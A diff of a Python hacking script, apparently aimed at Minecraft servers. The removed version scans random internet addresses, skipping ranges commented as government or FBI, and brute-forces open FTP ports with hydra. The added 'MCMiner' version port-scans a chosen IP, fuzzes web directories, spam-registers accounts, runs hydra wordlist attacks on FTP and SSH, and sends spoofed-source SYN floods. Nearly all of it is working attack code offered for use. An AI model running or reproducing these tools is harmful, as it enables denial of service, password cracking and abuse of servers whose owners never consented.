@@ -1,315 +1,337 @@
-import random
-import socket
 from colorama import Fore, init
-import os
+import requests
+from scapy.all import *
+import socket
+from random import randint
 import threading
 import time
-import datetime
+import mechanize
+import random
+import string
 
-amount = '0'
-
-init()
+from scapy.layers.inet import TCP, IP
 
 Fore.LR = Fore.LIGHTRED_EX
 Fore.LG = Fore.LIGHTGREEN_EX
 Fore.W = Fore.LIGHTWHITE_EX
-PORTS = [21]
+Fore.B = Fore.BLUE
+Fore.LB = Fore.LIGHTBLUE_EX
+Fore.R = Fore.RESET
+Fore.Y = Fore.YELLOW
+Fore.LBEX = Fore.LIGHTBLACK_EX
+Fore.LWEX = Fore.LIGHTWHITE_EX
+init()
 
+dirs = ['database/', 'db/', 'imgs/', 'index.html', 'index.php', 'register/', 'login/', 'sql/', 'robots.txt',
+        'credentials/', 'secret/', 'videos/', 'images/', 'js/', 'scripts/', 'style/', 'Login/', 'Register/',
+        'logs/', 'users/', 'store/', 'transactions/', 'staff/', 'test/', 'tests/', 'css/', 'minecraft/',
+        'rules/', 'vote/', 'search/', 'realms/', 'about/', '.htaccess', 'data/', 'logins/', 'admin/',
+        'accounts/', 'access/', 'assets/', 'sitemap.xml', 'ghost/', 'p/', 'email/']
 
-def main():
-    print('''
-           +-------------Welcome!------------+
-           |  119 101 108 99 111 109 101 33  |
-           | .-- . .-.. -.-. --- -- . .-.-.- | 
-           | 167 145 154 143 157 155 145 041 | 
-           +---------------------------------+ 
+login_dirs = ['index.html', 'index.php', 'index.htm']
+
+FTP = False
+SSH = False
+Website = False
+
+os.system('title MCMiner by wfsec')
+print(f'''
+
+    {Fore.LG}        
+    {Fore.GREEN}                ███╗   ███╗██╗███╗   ██╗███████╗██████╗ 
+    {Fore.LG}                ████╗ ████║██║████╗  ██║██╔════╝██╔══██╗
+    {Fore.GREEN}                ██╔████╔██║██║██╔██╗ ██║█████╗  ██████╔╝
+    {Fore.LG}                ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██╔══██╗
+    {Fore.GREEN}                ██║ ╚═╝ ██║██║██║ ╚████║███████╗██║  ██║
+    {Fore.LG}                ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝{Fore.R}                                                                        
     ''')
 
-
-def get_ipv4():
-    while True:
-        max = 255
-        ip1 = random.randint(0, max)
-        ip2 = random.randint(0, max)
-        ip3 = random.randint(0, max)
-        ip4 = random.randint(0, max)
-        if ip1 == 127:
-            continue
-        if ip1 == 0:
-            continue
-        # Cloudflare DNS
-        if ip1 == 1:
-            continue
-        # End of Cloudflare DNS
-        if ip1 == 3:
-            continue
-        if ip1 == 15:
-            continue
-        if ip1 == 56:
-            continue
-        if ip1 == 10:
-            continue
-        if ip1 == 25:
-            continue
-        if ip1 == 49:
-            continue
-        if ip1 == 50:
-            continue
-        if ip1 == 137:
-            continue
-        # Department of Defense
-        if ip1 == 6:
-            continue
-        if ip1 == 7:
-            continue
-        if ip1 == 11:
-            continue
-        if ip1 == 21:
-            continue
-        if ip1 == 22:
-            continue
-        if ip1 == 26:
-            continue
-        if ip1 == 28:
-            continue
-        if ip1 == 29:
-            continue
-        if ip1 == 30:
-            continue
-        if ip1 == 33:
-            continue
-        if ip1 == 55:
-            continue
-        if ip1 == 214:
-            continue
-        if ip1 == 215:
-            continue
-        # End of Department of Defense
-        if ip1 == 192 and ip2 == 168:
-            continue
-        if ip1 == 146 and ip2 == 17:
-            continue
-        if ip1 == 146 and ip2 == 80:
-            continue
-        if ip1 == 146 and ip2 == 98:
-            continue
-        if ip1 == 146 and ip2 == 154:
-            continue
-        if ip1 == 147 and ip2 == 159:
-            continue
-        if ip1 == 148 and ip2 == 114:
-            continue
-        if ip1 == 150 and ip2 == 125:
-            continue
-        if ip1 == 150 and ip2 == 133:
-            continue
-        if ip1 == 150 and ip2 == 144:
-            continue
-        if ip1 == 150 and ip2 == 149:
-            continue
-        if ip1 == 150 and ip2 == 157:
-            continue
-        if ip1 == 150 and ip2 == 184:
-            continue
-        if ip1 == 150 and ip2 == 190:
-            continue
-        if ip1 == 150 and ip2 == 196:
-            continue
-        if ip1 == 152 and ip2 == 82:
-            continue
-        if ip1 == 152 and ip2 == 229:
-            continue
-        if ip1 == 157 and ip2 == 202:
-            continue
-        if ip1 == 157 and ip2 == 217:
-            continue
-        if ip1 == 161 and ip2 == 124:
-            continue
-        if ip1 == 162 and ip2 == 32:
-            continue
-        if ip1 == 155 and ip2 == 96:
-            continue
-        if ip1 == 155 and ip2 == 149:
-            continue
-        if ip1 == 155 and ip2 == 155:
-            continue
-        if ip1 == 155 and ip2 == 178:
-            continue
-        if ip1 == 164 and ip2 == 158:
-            continue
-        if ip1 == 156 and ip2 == 9:
-            continue
-        if ip1 == 167 and ip2 == 44:
-            continue
-        if ip1 == 168 and ip2 == 68:
-            continue
-        if ip1 == 168 and ip2 == 85:
-            continue
-        if ip1 == 168 and ip2 == 102:
-            continue
-        if ip1 == 203 and ip2 == 59:
-            continue
-        if ip1 == 204 and ip2 == 34:
-            continue
-        if ip1 == 207 and ip2 == 30:
-            continue
-        if ip1 == 117 and ip2 == 55:
-            continue
-        if ip1 == 117 and ip2 == 56:
-            continue
-        if ip1 == 80 and ip2 == 235:
-            continue
-        if ip1 == 207 and ip2 == 120:
-            continue
-        if ip1 == 209 and ip2 == 35:
-            continue
-        if ip1 == 64 and ip2 == 70:
-            continue
-        if ip1 == 172 and ip2 >= 16 and ip2 < 32:
-            continue
-        if ip1 == 100 and ip2 >= 64 and ip2 < 127:
-            continue
-        if ip1 == 169 and ip2 > 254:
-            continue
-        if ip1 == 198 and ip2 >= 18 and ip2 < 20:
-            continue
-        if ip1 == 64 and ip2 >= 69 and ip2 < 227:
-            continue
-        if ip1 == 128 and ip2 >= 35 and ip2 < 237:
-            continue
-        if ip1 == 129 and ip2 >= 22 and ip2 < 255:
-            continue
-        if ip1 == 130 and ip2 >= 40 and ip2 < 168:
-            continue
-        if ip1 == 131 and ip2 >= 3 and ip2 < 251:
-            continue
-        if ip1 == 132 and ip2 >= 3 and ip2 < 251:
-            continue
-        if ip1 == 134 and ip2 >= 5 and ip2 < 235:
-            continue
-        if ip1 == 136 and ip2 >= 177 and ip2 < 223:
-            continue
-        if ip1 == 138 and ip2 >= 13 and ip2 < 194:
-            continue
-        if ip1 == 139 and ip2 >= 31 and ip2 < 143:
-            continue
-        if ip1 == 140 and ip2 >= 1 and ip2 < 203:
-            continue
-        if ip1 == 143 and ip2 >= 45 and ip2 < 233:
-            continue
-        if ip1 == 144 and ip2 >= 99 and ip2 < 253:
-            continue
-        if ip1 == 146 and ip2 >= 165 and ip2 < 166:
-            continue
-        if ip1 == 147 and ip2 >= 35 and ip2 < 43:
-            continue
-        if ip1 == 147 and ip2 >= 103 and ip2 < 105:
-            continue
-        if ip1 == 147 and ip2 >= 168 and ip2 < 170:
-            continue
-        if ip1 == 147 and ip2 >= 198 and ip2 < 200:
-            continue
-        if ip1 == 147 and ip2 >= 238 and ip2 < 255:
-            continue
-        if ip1 == 150 and ip2 >= 113 and ip2 < 115:
-            continue
-        if ip1 == 152 and ip2 >= 151 and ip2 < 155:
-            continue
-        if ip1 == 153 and ip2 >= 21 and ip2 < 32:
-            continue
-        if ip1 == 155 and ip2 >= 5 and ip2 < 10:
-            continue
-        if ip1 == 155 and ip2 >= 74 and ip2 < 89:
-            continue
-        if ip1 == 155 and ip2 >= 213 and ip2 < 222:
-            continue
-        if ip1 == 157 and ip2 >= 150 and ip2 < 154:
-            continue
-        if ip1 == 158 and ip2 >= 1 and ip2 < 21:
-            continue
-        if ip1 == 158 and ip2 >= 235 and ip2 < 247:
-            continue
-        if ip1 == 159 and ip2 >= 120 and ip2 < 121:
-            continue
-        if ip1 == 160 and ip2 >= 132 and ip2 < 151:
-            continue
-        if ip1 == 64 and ip2 >= 224 and ip2 < 227:
-            continue
-        # CIA
-        if ip1 == 162 and ip2 >= 45 and ip2 < 47:
-            continue
-        # NASA Kennedy Space Center
-        if ip1 == 163 and ip2 >= 205 and ip2 < 207:
-            continue
-        if ip1 == 164 and ip2 >= 45 and ip2 < 50:
-            continue
-        if ip1 == 164 and ip2 >= 217 and ip2 < 233:
-            continue
-        # FBI controlled Linux servers & IPs/IP-Ranges
-        if ip1 == 207 and ip2 >= 60 and ip2 < 62:
-            continue
-        # Cloudflare
-        if ip1 == 104 and ip2 >= 16 and ip2 < 31:
-            continue
-        if ip1 == 193 and ip2 == 164:
-            continue
-        if ip1 == 120 and ip2 >= 103 and ip2 < 108:
-            continue
-        if ip1 == 188 and ip2 == 68:
-            continue
-        if ip1 == 78 and ip2 == 46:
-            continue
-        if ip1 >= 224:
-            continue
-        if (ip1 == 178 and ip2 == 128) or (ip1 == 123 and ip2 == 59):
-            continue
-        elif (ip1 == 124 and ip2 == 244) or (ip1 == 178 and ip2 == 254) or (ip1 == 185 and ip2 == 168) or (ip1 == 178 and ip2 == 79):
-            continue
-        ip = str(ip1) + '.' + str(ip2) + '.' + str(ip3) + '.' + str(ip4)
-        return ip
+PORTS = {21: 'FTP',
+         22: 'SSH',
+         23: 'TELNET',
+         53: 'DNS',
+         80: 'HTTP',
+         443: 'HTTPS',
+         3389: 'RDP',
+         8080: 'ALT HTTP',
+         19312: 'Bedrock',
+         25565: 'JavaServer'}
 
 
-def hack(IP):
-    try:
-        for x in PORTS:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(3)  # If host does not react after 3 seconds, it closes
-            result = s.connect_ex((IP, x))
-            if result == 0:
-                if x == 21:
-                    proto = 'ftp'
-                elif x == 22:
-                    proto = 'ssh'
-                elif x == 3389:
-                    proto = 'rdp'
-                elif x == 23:
-                    proto = 'telnet'
-                elif x == 5900:
-                    proto = 'vnc'
-                print(f' [{datetime.time}] <--scan--> Port {x} is {Fore.LG}open{Fore.W} on{Fore.LG} {IP}{Fore.W}')
-                s.close()
-                os.system(f'hydra -L usernames.txt -P passwords.txt -I -V -t 4 -K {IP} {proto}')
-            else:
-                    print(f' [{datetime.time}] <--scan--> Port {x} is {Fore.LR}closed{Fore.W} on{Fore.LR} {IP}{Fore.W}')
-                    s.close()
+def syn_flood(dst_ip: str, dst_port: int):
+    ip_packet = IP()
+    ip_packet.src = ".".join(map(str, [randint(0, 255) for _ in range(4)]))
+    ip_packet.dst = dst_ip
+
+    tcp_packet = TCP()
+    tcp_packet.sport = randint(1000, 9000)
+    tcp_packet.dport = dst_port
+    tcp_packet.flags = "S"
+    tcp_packet.seq = randint(1000, 9000)
+    tcp_packet.window = randint(1000, 9000)
+
+    send(ip_packet / tcp_packet, verbose=0)
+
+
+def ddos_threading():
+    counter = int(input("               How many packets do you want to send: "))
+    dst_ip = input("\n               Target IP: ")
+    dst_port = int(input("               Target Port: "))
+
+    print("               Packets are sending...")
+    for i in range(counter):
+        ddos_thread = threading.Thread(target=syn_flood, args=[dst_ip, dst_port], daemon=True)
+        print(f'               {Fore.LB}[{i}]{Fore.W} Sent packet to {Fore.LIGHTYELLOW_EX}{dst_ip}:{dst_port}{Fore.W}')
+        time.sleep(2)
+        ddos_thread.start()
+    print(f"\n               Total packets sent: {counter}\n")
+
+
+ip = input('            IP: ')
+
+print('')
+print('')
+
+for port in PORTS:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(1)  # Terminate connection if no response after 3 seconds
+    result = s.connect_ex((ip, port))
+
+    if result == 0:
+        if port == 21:
+            FTP = True
+        if port == 22:
+            SSH = True
+        if port == 80:
+            Website = True
+        print(f'{Fore.LG}       [+]{Fore.W} Port {port} is open on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
         s.close()
-    except Exception as ex:
-        print(ex)
-        pass
+    else:
+        print(
+            f'{Fore.LR}       [-]{Fore.W} Port {port} is closed on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
+        s.close()
+
+resp = requests.get(f'https://api.mcsrvstat.us/2/{ip}')  # Query the server status API
+print('')
+
+SRV = resp.json().get("srv")
+SERVER_IP = resp.json().get("ip")
+ONLINE_MODE = resp.json().get("online")
+VERSION = resp.json().get("version")
+QUERY = resp.json().get("query")
+
+print(f'''
+            {Fore.RED}Query:{Fore.R} {QUERY}
+            {Fore.RED}Version:{Fore.R} {VERSION}
+            {Fore.RED}Online Mode:{Fore.R} {ONLINE_MODE}
+            {Fore.RED}Server IP:{Fore.R} {SERVER_IP}
+            {Fore.RED}SRV:{Fore.R} {SRV}
+''')
 
 
-Unlim = True
-if Unlim:
-    try:
-        while Unlim:
-            IP = get_ipv4()
-            scanThread = threading.Thread(target=hack, args=(IP,), daemon=True)  # Starts the scanning thread
-            time.sleep(0.05)
-            scanThread.start()
-    except KeyboardInterrupt:
-        print(f'cacneled :c{Fore.W}')
+def fuzz(directory):
+    fuzz_url = f'http://{ip}/{directory}'
+    status = requests.get(fuzz_url, headers=user_agent).status_code
+
+    if status == 200:
+        meaning = '[OK]'
+        color = Fore.LIGHTGREEN_EX
+        if directory == 'login/':
+            ask_spam = input(f'             Do you want to find more about "{directory}"? y/n: ')
+            if ask_spam == 'y':
+
+                for dir in login_dirs:
+                    login_fuzz_url = f'http://{ip}/login/{dir}'
+                    login_status = requests.get(str(login_fuzz_url), headers=user_agent).status_code
+
+                    if login_status == 200:
+                        meaning = '[OK]'
+                        color = Fore.LIGHTGREEN_EX
+                        print(f'            {color}[{login_status}] {meaning} {Fore.W} {login_fuzz_url}')
+                        ask_account_creation = input('             Do you want to spam create accounts? y/n: ')
+                        if ask_account_creation == 'y':
+                            account_count = input('             How many accounts to create?: ')
+                            url = login_fuzz_url
+
+                            for _ in range(int(account_count)):
+                                letters = string.ascii_lowercase
+                                username = ''.join(random.choice(letters) for i in range(10))
+                                email = ''.join(random.choice(letters) for i in range(10)).join('@gmail.com')
+                                password = 'Fuck_you_lol!'
+                                br = mechanize.Browser()
+                                br.addheaders = [('User-agent',
+                                                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')]
+                                br.set_handle_robots(False)
+                                br.open(url)
+
+                                br.select_form(nr=0)
+
+                                emailf = br.form.find_control(id="email")
+                                emailf.value = email
+
+                                usernamef = br.form.find_control(id="username")
+                                usernamef.value = username
+
+                                passwordf = br.form.find_control(id="password")
+                                passwordf.value = password
+
+                                confirmPasswordf = br.form.find_control(id="confirmPassword")
+                                confirmPasswordf.value = password
+
+                                br.submit()
+                                time.sleep(1)
+                                nexturl = br.geturl()
+                                print(f'             {Fore.LG}[+]{Fore.W} Account created:{Fore.LB} {nexturl}{Fore.W}')
+
+                    elif login_status == 404:
+                        meaning = '[Not Found]'
+                        color = Fore.LIGHTGREEN_EX
+                        print(f'            {color}[{login_status}] {meaning} {Fore.W} {login_fuzz_url}')
+
+                    else:
+                        meaning = '[Unknown]'
+                        color = Fore.LIGHTYELLOW_EX
+                        print(f'            {color}[{login_status}] {meaning} {Fore.W} {login_fuzz_url}')
+
+        elif directory == 'Login/':
+            ask_spam2 = input(f'             Do you want to find more about "{directory}"? y/n: ')
+            if ask_spam2 == 'y':
+
+                for dir in login_dirs:
+                    login_fuzz_url2 = f'http://{ip}/login/{dir}'
+                    login_status2 = requests.get(str(login_fuzz_url2), headers=user_agent).status_code
+
+                    if login_status2 == 200:
+                        meaning = '[OK]'
+                        color = Fore.LIGHTGREEN_EX
+                        print(f'            {color}[{login_status2}] {meaning} {Fore.W} {login_fuzz_url2}')
+                        ask_account_creation = input('             Do you want to spam create accounts? y/n: ')
+                        if ask_account_creation == 'y':
+                            account_count = input('             How many accounts to create?: ')
+                            url = login_fuzz_url2
+
+                            for _ in range(int(account_count)):
+                                letters = string.ascii_lowercase
+                                username = ''.join(random.choice(letters) for i in range(10))
+                                email = ''.join(random.choice(letters) for i in range(10)).join('@gmail.com')
+                                password = 'Fuck_you_lol!'
+                                br = mechanize.Browser()
+                                br.addheaders = [('User-agent',
+                                                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')]
+                                br.set_handle_robots(False)
+                                br.open(url)
+
+                                br.select_form(nr=0)
+
+                                emailf = br.form.find_control(id="email")
+                                emailf.value = email
+
+                                usernamef = br.form.find_control(id="username")
+                                usernamef.value = username
+
+                                passwordf = br.form.find_control(id="password")
+                                passwordf.value = password
+
+                                confirmPasswordf = br.form.find_control(id="confirmPassword")
+                                confirmPasswordf.value = password
+
+                                br.submit()
+                                time.sleep(1)
+                                nexturl = br.geturl()
+                                print(f'             {Fore.LG}[+]{Fore.W} Account created:{Fore.LB} {nexturl}{Fore.W}')
+
+                    elif login_status2 == 404:
+                        meaning = '[Not Found]'
+                        color = Fore.LIGHTGREEN_EX
+                        print(f'            {color}[{login_status2}] {meaning} {Fore.W} {login_fuzz_url2}')
+
+                    else:
+                        meaning = '[Unknown]'
+                        color = Fore.LIGHTYELLOW_EX
+                        print(f'            {color}[{login_status2}] {meaning} {Fore.W} {login_fuzz_url2}')
+
+    elif status == 403:
+        meaning = '[Forbidden]'
+        color = Fore.LIGHTRED_EX
+
+    elif status == 404:
+        meaning = '[Not Found]'
+        color = Fore.LIGHTRED_EX
+
+    elif status == 429:
+        meaning = '[Too Many Requests]'
+        color = Fore.LIGHTYELLOW_EX
+
+    else:
+        meaning = ''
+        color = Fore.LIGHTBLUE_EX
+    print(f'            {color}[{status}] {meaning} {Fore.W} {fuzz_url}')
+
+    time.sleep(0.1)
 
 
-if __name__ == "__main__":
-    hack(IP)
+def threads_handler():
+    for directory in dirs:
+        fuzz_thread = threading.Thread(target=fuzz, args=(directory,), daemon=True)  # Starts the fuzzing thread
+        time.sleep(0.8)
+        fuzz_thread.start()
 
+
+if Website:
+    WebASK = input('            Do you want to information about website? y/n: ')
+    if WebASK == 'y':
+        user_agent = {
+            'User-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060313 Debian/1.5.dfsg+1.5.0.1-4 Firefox/1.5.0.1'}
+        r = requests.get(f'http://{ip}', headers=user_agent)
+        print('')
+        for res in r.history:
+            print(f'            {Fore.LB}[{r.status_code}]{Fore.W} Redirected to{Fore.LWEX} {res.url}')
+        d = requests.head(f'http://{ip}', headers=user_agent)
+        print(f'''
+                {Fore.LB}Server:{Fore.W} {d.headers["server"]}
+                {Fore.LB}Content type:{Fore.W} {d.headers["content-type"]}
+        ''')
+        print('')
+
+        fuzzask = input('            Do you want to fuzz the site? y/n: ')
+        if fuzzask == 'y':
+            threads_handler()
+        else:
+            print('               Ok.')
+            print('')
+    else:
+        print('               Ok.')
+        print('')
+
+if FTP:
+    print('')
+    FTPASK = input('            Do you want to Wordlist attack on FTP? y/n: ')
+    if FTPASK == 'y':
+        the_proto = 'ftp'
+        ftp_username_wordlist = input('             Username Wordlist: ')
+        ftp_password_wordlist = input('             Password Wordlist: ')
+        print('')
+        os.system(f'hydra -L {ftp_username_wordlist} -P {ftp_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
+    else:
+        print('''               Ok.
+                    ''')
+
+if SSH:
+    print('')
+    SSHASK = input('             Do you want to Wordlist attack on SSH? y/n: ')
+    if SSHASK == 'y':
+        the_proto = 'ssh'
+        ssh_username_wordlist = input('             Username Wordlist: ')
+        ssh_password_wordlist = input('             Password Wordlist: ')
+        print('')
+        os.system(f'hydra -L {ssh_username_wordlist} -P {ssh_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
+    else:
+        print('''               Ok.
+                    ''')
+
+ddos_ask = input('            Do you want to send packets? y/n: ')
+if ddos_ask == 'y':
+    ddos_threading()
+else:
+    print('               Ok.')
+    print('')
